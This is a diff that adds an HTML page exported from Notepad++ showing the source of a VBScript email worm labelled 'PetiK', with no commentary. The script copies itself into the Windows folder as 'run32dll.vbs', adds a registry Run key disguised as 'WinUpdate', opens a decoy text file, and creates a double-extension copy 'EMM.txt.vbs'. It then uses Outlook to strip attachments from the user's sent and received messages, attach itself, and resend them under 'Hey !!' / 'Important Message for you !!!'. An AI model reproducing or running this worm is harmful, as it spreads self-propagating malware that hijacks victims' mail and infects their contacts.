@@ -1,0 +1,112 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'PetiK
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">randomize</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">wscriptshell</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"wscript.shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">drives</span><span class="sc6">=</span><span class="sc7">fso.drives</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">drive</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">drives</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">drive</span><span class="sc6">=</span><span class="sc4">"C:"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">drive.isready</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">drivefull</span><span class="sc6">=</span><span class="sc7">drive</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">e5d</span><span class="sc6">=</span><span class="sc7">fso.getfolder</span><span class="sc6">(</span><span class="sc7">drivefull</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">subs</span><span class="sc6">=</span><span class="sc7">e5d.subfolders</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">subfolder</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">subs</span><span class="sc0">
+</span><span class="sc7">subst</span><span class="sc6">=</span><span class="sc3">mid</span><span class="sc6">(</span><span class="sc7">subfolder.path</span><span class="sc6">,</span><span class="sc2">4</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">subst</span><span class="sc6">=</span><span class="sc4">"WIN"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">auto</span><span class="sc6">=</span><span class="sc7">subfolder.path</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc7">autos</span><span class="sc6">=</span><span class="sc3">auto</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\run32dll.vbs"</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">autos</span><span class="sc0">
+</span><span class="sc7">wscriptshell.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate"</span><span class="sc6">,</span><span class="sc4">"wscript.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">autos</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"%"</span><span class="sc0"> 
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">autos</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">all</span><span class="sc6">=</span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">datafiln</span><span class="sc6">=</span><span class="sc3">auto&amp;</span><span class="sc4">"\EMM.txt"</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">dat</span><span class="sc6">=</span><span class="sc7">fso.createtextfile</span><span class="sc6">(</span><span class="sc7">datafiln</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">dat.write</span><span class="sc0"> </span><span class="sc7">all</span><span class="sc0">
+</span><span class="sc7">dat.close</span><span class="sc0">
+</span><span class="sc7">wscriptshell.run</span><span class="sc0"> </span><span class="sc4">"notepad.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">datafiln</span><span class="sc6">,</span><span class="sc2">3</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc7">mailed</span><span class="sc6">=</span><span class="sc3">auto</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\EMM.txt.vbs"</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">wscriptshell.regread</span><span class="sc6">(</span><span class="sc4">"HKLM\SOFTWARE\Microsoft"</span><span class="sc6">)&lt;&gt;</span><span class="sc4">"1"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc7">createobject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> 
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">mapi</span><span class="sc6">=</span><span class="sc7">out.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc7">mapi.getdefaultfolder</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">newitem.items.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">newitem.items</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">item.Attachments.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">item.Attachments</span><span class="sc0">
+</span><span class="sc7">itatt.delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc7">item.subject</span><span class="sc6">=</span><span class="sc4">"Hey !!"</span><span class="sc0">
+</span><span class="sc7">item.Body</span><span class="sc6">=</span><span class="sc4">"Important Message for you !!!"</span><span class="sc0">
+</span><span class="sc7">item.attachments.add</span><span class="sc0"> </span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc7">item.send</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc6">=</span><span class="sc3">nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc7">mapi.getdefaultfolder</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">newitem.items.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">1</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">newitem.items</span><span class="sc0">
+</span><span class="sc3">do</span><span class="sc0"> </span><span class="sc3">while</span><span class="sc0"> </span><span class="sc7">item.Attachments.count</span><span class="sc6">&lt;&gt;</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc3">for</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">item.Attachments</span><span class="sc0">
+</span><span class="sc7">itatt.delete</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc7">item.subject</span><span class="sc6">=</span><span class="sc4">"Hey !!"</span><span class="sc0">
+</span><span class="sc7">item.Body</span><span class="sc6">=</span><span class="sc4">"Important Message for you !!!"</span><span class="sc0">
+</span><span class="sc7">item.attachments.add</span><span class="sc0"> </span><span class="sc7">mailed</span><span class="sc0">
+</span><span class="sc7">item.send</span><span class="sc0">
+</span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">loop</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">item</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">itatt</span><span class="sc6">=</span><span class="sc3">nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">newitem</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc3">set</span><span class="sc0"> </span><span class="sc7">out</span><span class="sc6">=</span><span class="sc3">Nothing</span><span class="sc0">
+</span><span class="sc7">wscriptshell.regwrite</span><span class="sc0"> </span><span class="sc4">"HKLM\SOFTWARE\Microsoft"</span><span class="sc6">,</span><span class="sc4">"1"</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span></div></body>
+</html>
